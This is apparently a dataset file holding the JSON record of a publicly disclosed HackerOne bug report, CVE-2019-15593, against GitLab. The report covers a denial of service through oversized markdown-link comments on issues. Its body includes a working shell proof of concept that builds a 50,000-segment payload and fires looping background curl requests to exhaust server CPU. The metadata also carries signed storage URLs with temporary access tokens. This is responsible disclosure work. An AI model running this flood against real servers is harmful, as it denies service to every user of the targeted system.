@@ -1,0 +1,199 @@
+{
+  "id": 557154,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NTcxNTQ=",
+  "url": "https://hackerone.com/reports/557154",
+  "title": "DoS attack via comment on Issue",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-30T17:59:37.266Z",
+  "submitted_at": "2019-04-30T17:59:37.266Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "8ayac",
+    "url": "/8ayac",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/266/369/5dc3ed65f4f281d1710a1728d46e13dc3c7db062_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-15593"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-11-21T14:27:05.916Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-11-07T06:57:30.778Z",
+  "team_member_agreed_on_going_public_at": "2019-11-21T14:27:05.796Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nThere is no limit to the number of characters in the issue comments, which allows a DoS attack. The DoS attack affects both server-side and client-side.\n\n**NOTE**: This bug happens on GitLab.com.\n\n### Steps to reproduce\n\u25bcAttack for Client-side \n1. Sign in to GitLab.\n2. Create a project as below:\n    - Project name: test01\n    - Project slug: test01\n    - Visibility Level: Public\n    - Initialize repository with README: Checked\n3. Create a new issue for the project created in Step 2.\n4. Post some comments on the Issue created in Step 3.\n5. Post a comment as below:\n`[a](/a/a/a/a/a/a/a/a/a/a/a/a/a/a.....(50000 times))`\n6. Reload the Issue page.\n\nResult: I received an error message \"Something went wrong while fetching comments. Please try again.\" And I could not fetch all the comments.\n\nNote: In Step 5, if you can not post the comment from the browser, send the HTTP request directly in some way.\nNote: The string to post in step 5 is described in the attached file F481358.\n\n- PoC movie: F481363\n\n\u25bcAttack for Server-side\nAn attacker can exhaust server resources by continuously sending the requests generated in Step 5 of [Attack for Client-side]. This causes a denial of service to all users.\n\nFor example, you can verify it with a script as below:\n```sh\n#!/bin/sh\ncharBlock=$(head -c 50000 /dev/zero | sed -e 's/\\x00/\\/a/g')\npayload='[a]('$charBlock')'\n\ngitlabHost=$1\nProjectURL=$2\ntargetID=$3\nloop=$4\n\ncurl=`cat << EOS\ncurl\n  --insecure\n  --silent\n  --output /dev/null\n  ${ProjectURL}/notes?target_id=${targetID}\\&target_type=issue\n  --header 'Host: ${gitlabHost}'\n  --header 'X-CSRF-Token: [PLACEHOLDER]'\n  -b '_gitlab_session=[PLACEHOLDER]'\n  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'\nEOS`\n\nfor i in `seq ${loop}`\ndo\n    eval ${curl}&\ndone\n```\n\nRun the above script with the following command to see that the server's CPU is exhausted.\n```\n$ ./poc.sh [GitLab host] [Project URL] [target ID(\u203b1)] [Repeat count of request]\n```\n\u203b1: Get from the request generated in step 5 of [Client-side attack].\n\n- PoC movie:  F481365 \n\n\n#### Results of GitLab environment info\n```\nSystem information\nSystem:\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.5.3p105\nGem Version:    2.7.6\nBundler Version:1.17.3\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.18.1\nSidekiq Version:5.2.5\nGo Version:     unknown\n\nGitLab information\nVersion:        11.10.2\nRevision:       f3e84e78b62\nDirectory:      /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:     PostgreSQL\nDB Version:     9.6.11\nURL:            https://gitlab.example.com\nHTTP Clone URL: https://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.com:some-group/some-project.git\nUsing LDAP:     no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:        9.0.0\nRepository storage paths:\n- default:      /var/opt/gitlab/git-data/repositories\nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n### Impact for client-side \nAll comments on Issue will be inaccessible.\n\n### Impact for server-side:\nThe CPU is exhausted and users will be able to access the GitLab service.\n\nNOTE: All users who can comment on the issue can exploit this vulnerability.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 481358,
+      "file_name": "payload.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/358/48755da12a9db0c05dae266410c49519411b29d7/payload.txt?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYC3QOVN%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T154917Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD2Pr0rLDOcTpJuTeBLaj5uNouk01%2F%2FGMnQ%2B%2BpHIfuaTAIgRO1FIYLJIostwiv619cxpbCBCvw1SorxdM5m%2B15NPmYqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCjpH5K6Ey3UqHa7KyqOBRICKnNlDYybV9MTqjJ%2BWfYmEdRrxsXwCEMTQgvHzNnxaBVyfQKGabHErF%2F1bxjGjbmIKfLLxWaRHlllfVYIC3Bq8QwRwkJCcvnDGvMlElFzQnVg%2BZv38oD2SJWdNkZtBnypZMVDHbbqZd%2Bqo76Li6dps8oTwDzMEaE8Lfh1awtO2NZzP%2BNtTV5cpQIBpGN0iFy49RIfQEGH4ejF9itVUtq8yMGh6oZW0kI%2Fxj2%2FMtyu6MCmDBPbGcEkMdqdTjA5YYg9BvBgH%2FbFTXeYHo7K9sSuStylE%2BO2BmR09pl5GH9inXtwvnBOFeL90immd8WKsjx1m9llSW7ZJw8xLGDgHlEQ6oYDRJhVdrUqScFBxaeLRaxQnJb5XNWT0cXYIN3PiGjNcC0eU0xEPgh5FgTYUQ2L59gT7FQIRZklBk%2FHQhalziHcLZyzP0XXXSWQpj1yCuoDbMWhYUg1HG81P5fRFq5zqR%2BttrFYoy%2FzQ%2B8CjgyXUxABdro4fUfJRDpNhYimDn66u0faUElhvVYN5L0DgtEj1fbI345DuvQkWbPDGXOJH%2F3VB2d64IIHy3pa%2BCCuuPpUPBJmnrcjvZeBn3CQXsyP59%2B4gxL5xx8mITAS0LnV2EF6G5fa7HKShDR80v%2B04Sx3ng4UN74PSKVT7lSH7PqDySWJrLRZkSyAfECsT3%2FKYbIkkSCHR3%2BRj0Vpk9g%2FAXLT5vqMFmShR%2B9iUsk4TZEcEpBupTnpTVMh8W1ci%2FMnNLVqqAN7cDcRHrIcdbeTVd%2FFEJfLIpZM5tAckx3VS%2BVVaTVhl%2F2fKdyDbWS6WZ%2FmkhZwlBuvkQzX7NqfNGml8njcKty9kItoR%2FzLWGwZdYBH1n3DuKb2JX4Rpwb8yjDshpbRBjqxAVIJMc7Z2a4YraOSR1QwRu56QBvllNlbuOYbOmh1iYTB%2BKOwaEQRT2AfHH4qgUNANX1M23X6R8LfyxBozQyMcuuGT8S3JwwlPC2iZGE%2BMo0oZwcBz0LXlD1uvC09DV%2BUr0JGfTQWItnpYNknb2sYsvkTyixbxhvMDA8kC5I4RsddRIyyBPC7ZWu6KLc8AOALcSUNkc7GvUtqG7OSKvO4uSt7cI9k4aRR8ifgJxPgtpE8qw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=65203127368309510c0559bab253d0d16c58ebde3fbe9329749867dc86f92a81",
+      "file_size": 100005,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 481363,
+      "file_name": "poc1.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/363/2b1c98c6a2e5559d4f84f8960099a3d90cc48efc/poc1.mp4?response-content-disposition=attachment%3B%20filename%3D%22poc1.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc1.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYC3QOVN%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T154917Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD2Pr0rLDOcTpJuTeBLaj5uNouk01%2F%2FGMnQ%2B%2BpHIfuaTAIgRO1FIYLJIostwiv619cxpbCBCvw1SorxdM5m%2B15NPmYqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCjpH5K6Ey3UqHa7KyqOBRICKnNlDYybV9MTqjJ%2BWfYmEdRrxsXwCEMTQgvHzNnxaBVyfQKGabHErF%2F1bxjGjbmIKfLLxWaRHlllfVYIC3Bq8QwRwkJCcvnDGvMlElFzQnVg%2BZv38oD2SJWdNkZtBnypZMVDHbbqZd%2Bqo76Li6dps8oTwDzMEaE8Lfh1awtO2NZzP%2BNtTV5cpQIBpGN0iFy49RIfQEGH4ejF9itVUtq8yMGh6oZW0kI%2Fxj2%2FMtyu6MCmDBPbGcEkMdqdTjA5YYg9BvBgH%2FbFTXeYHo7K9sSuStylE%2BO2BmR09pl5GH9inXtwvnBOFeL90immd8WKsjx1m9llSW7ZJw8xLGDgHlEQ6oYDRJhVdrUqScFBxaeLRaxQnJb5XNWT0cXYIN3PiGjNcC0eU0xEPgh5FgTYUQ2L59gT7FQIRZklBk%2FHQhalziHcLZyzP0XXXSWQpj1yCuoDbMWhYUg1HG81P5fRFq5zqR%2BttrFYoy%2FzQ%2B8CjgyXUxABdro4fUfJRDpNhYimDn66u0faUElhvVYN5L0DgtEj1fbI345DuvQkWbPDGXOJH%2F3VB2d64IIHy3pa%2BCCuuPpUPBJmnrcjvZeBn3CQXsyP59%2B4gxL5xx8mITAS0LnV2EF6G5fa7HKShDR80v%2B04Sx3ng4UN74PSKVT7lSH7PqDySWJrLRZkSyAfECsT3%2FKYbIkkSCHR3%2BRj0Vpk9g%2FAXLT5vqMFmShR%2B9iUsk4TZEcEpBupTnpTVMh8W1ci%2FMnNLVqqAN7cDcRHrIcdbeTVd%2FFEJfLIpZM5tAckx3VS%2BVVaTVhl%2F2fKdyDbWS6WZ%2FmkhZwlBuvkQzX7NqfNGml8njcKty9kItoR%2FzLWGwZdYBH1n3DuKb2JX4Rpwb8yjDshpbRBjqxAVIJMc7Z2a4YraOSR1QwRu56QBvllNlbuOYbOmh1iYTB%2BKOwaEQRT2AfHH4qgUNANX1M23X6R8LfyxBozQyMcuuGT8S3JwwlPC2iZGE%2BMo0oZwcBz0LXlD1uvC09DV%2BUr0JGfTQWItnpYNknb2sYsvkTyixbxhvMDA8kC5I4RsddRIyyBPC7ZWu6KLc8AOALcSUNkc7GvUtqG7OSKvO4uSt7cI9k4aRR8ifgJxPgtpE8qw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7c8be1dd43a4dbde02d8d451bb187c3ffcb24002b7fbbd3a14b242e856c2095f",
+      "file_size": 90092231,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 481365,
+      "file_name": "poc2.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/481/365/a11cd1f587cef176913d1f751e58a610e371c2bf/poc2.mp4?response-content-disposition=attachment%3B%20filename%3D%22poc2.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc2.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYC3QOVN%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T154917Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD2Pr0rLDOcTpJuTeBLaj5uNouk01%2F%2FGMnQ%2B%2BpHIfuaTAIgRO1FIYLJIostwiv619cxpbCBCvw1SorxdM5m%2B15NPmYqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCjpH5K6Ey3UqHa7KyqOBRICKnNlDYybV9MTqjJ%2BWfYmEdRrxsXwCEMTQgvHzNnxaBVyfQKGabHErF%2F1bxjGjbmIKfLLxWaRHlllfVYIC3Bq8QwRwkJCcvnDGvMlElFzQnVg%2BZv38oD2SJWdNkZtBnypZMVDHbbqZd%2Bqo76Li6dps8oTwDzMEaE8Lfh1awtO2NZzP%2BNtTV5cpQIBpGN0iFy49RIfQEGH4ejF9itVUtq8yMGh6oZW0kI%2Fxj2%2FMtyu6MCmDBPbGcEkMdqdTjA5YYg9BvBgH%2FbFTXeYHo7K9sSuStylE%2BO2BmR09pl5GH9inXtwvnBOFeL90immd8WKsjx1m9llSW7ZJw8xLGDgHlEQ6oYDRJhVdrUqScFBxaeLRaxQnJb5XNWT0cXYIN3PiGjNcC0eU0xEPgh5FgTYUQ2L59gT7FQIRZklBk%2FHQhalziHcLZyzP0XXXSWQpj1yCuoDbMWhYUg1HG81P5fRFq5zqR%2BttrFYoy%2FzQ%2B8CjgyXUxABdro4fUfJRDpNhYimDn66u0faUElhvVYN5L0DgtEj1fbI345DuvQkWbPDGXOJH%2F3VB2d64IIHy3pa%2BCCuuPpUPBJmnrcjvZeBn3CQXsyP59%2B4gxL5xx8mITAS0LnV2EF6G5fa7HKShDR80v%2B04Sx3ng4UN74PSKVT7lSH7PqDySWJrLRZkSyAfECsT3%2FKYbIkkSCHR3%2BRj0Vpk9g%2FAXLT5vqMFmShR%2B9iUsk4TZEcEpBupTnpTVMh8W1ci%2FMnNLVqqAN7cDcRHrIcdbeTVd%2FFEJfLIpZM5tAckx3VS%2BVVaTVhl%2F2fKdyDbWS6WZ%2FmkhZwlBuvkQzX7NqfNGml8njcKty9kItoR%2FzLWGwZdYBH1n3DuKb2JX4Rpwb8yjDshpbRBjqxAVIJMc7Z2a4YraOSR1QwRu56QBvllNlbuOYbOmh1iYTB%2BKOwaEQRT2AfHH4qgUNANX1M23X6R8LfyxBozQyMcuuGT8S3JwwlPC2iZGE%2BMo0oZwcBz0LXlD1uvC09DV%2BUr0JGfTQWItnpYNknb2sYsvkTyixbxhvMDA8kC5I4RsddRIyyBPC7ZWu6KLc8AOALcSUNkc7GvUtqG7OSKvO4uSt7cI9k4aRR8ifgJxPgtpE8qw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=11901602ac8ea366dbf9492abed70d90b128be5a5d5b0b6a420e1acdb3f8b269",
+      "file_size": 247941882,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 84,
+  "voters": [
+    "nnxxrr",
+    "devploit",
+    "m4t35z",
+    "n1m0",
+    "manuelz120",
+    "foobar7",
+    "base_64",
+    "0-chrollo-0",
+    "ali",
+    "sameerphad72",
+    "and 74 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
